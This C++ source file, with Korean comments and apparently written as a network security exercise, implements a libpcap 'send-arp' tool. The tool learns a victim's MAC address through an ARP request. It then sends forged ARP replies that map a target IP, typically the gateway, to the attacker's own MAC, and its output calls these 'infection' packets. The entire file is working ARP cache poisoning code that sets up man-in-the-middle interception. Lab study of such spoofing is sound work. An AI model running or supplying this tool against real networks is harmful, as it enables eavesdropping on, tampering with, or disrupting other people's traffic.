#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ifaddrs.h>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// 자신의 MAC 주소 획득
Mac getMyMac(const char* dev) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// 자신의 IP 주소 획득
Ip getMyIp(const char* dev) {
    struct ifaddrs* addrs;
    getifaddrs(&addrs);
    for (struct ifaddrs* addr = addrs; addr != nullptr; addr = addr->ifa_next) {
        if (addr->ifa_addr && addr->ifa_addr->sa_family == AF_INET &&
            std::string(addr->ifa_name) == dev) {
            Ip ip(ntohl(((struct sockaddr_in*)addr->ifa_addr)->sin_addr.s_addr));
            freeifaddrs(addrs);
            return ip;
        }
    }
    freeifaddrs(addrs);
    return Ip("0.0.0.0");
}

// ARP 요청으로 상대 MAC 획득
Mac getMacByIp(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(targetIp);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    struct pcap_pkthdr* header;
    const u_char* reply;
    while (true) {
        int res = pcap_next_ex(handle, &header, &reply);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv = (EthArpPacket*)reply;
        if (recv->eth_.type_ == htons(EthHdr::Arp) &&
            recv->arp_.op_ == htons(ArpHdr::Reply) &&
            Ip(ntohl(recv->arp_.sip_)) == targetIp) {
            return recv->arp_.smac_;
        }
    }
    return Mac("00:00:00:00:00:00");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }

    Mac myMac = getMyMac(dev);
    Ip myIp = getMyIp(dev);
    printf("[INFO] Attacker MAC : %s\n", std::string(myMac).c_str());
    printf("[INFO] Attacker IP  : %s\n", std::string(myIp).c_str());

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);

        printf("[*] Processing sender: %s, target: %s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());

        Mac senderMac = getMacByIp(handle, myMac, myIp, senderIp);
        printf("[INFO] Sender MAC: %s\n", std::string(senderMac).c_str());

        EthArpPacket infect;
        infect.eth_.dmac_ = senderMac;
        infect.eth_.smac_ = myMac;
        infect.eth_.type_ = htons(EthHdr::Arp);

        infect.arp_.hrd_ = htons(ArpHdr::ETHER);
        infect.arp_.pro_ = htons(EthHdr::Ip4);
        infect.arp_.hln_ = Mac::Size;
        infect.arp_.pln_ = Ip::Size;
        infect.arp_.op_  = htons(ArpHdr::Reply);
        infect.arp_.smac_ = myMac;
        infect.arp_.sip_  = htonl(targetIp);
        infect.arp_.tmac_ = senderMac;
        infect.arp_.tip_  = htonl(senderIp);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&infect), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
        } else {
            printf("[✓] Sent infection packet to %s\n", std::string(senderIp).c_str());
        }
    }

    pcap_close(handle);
}

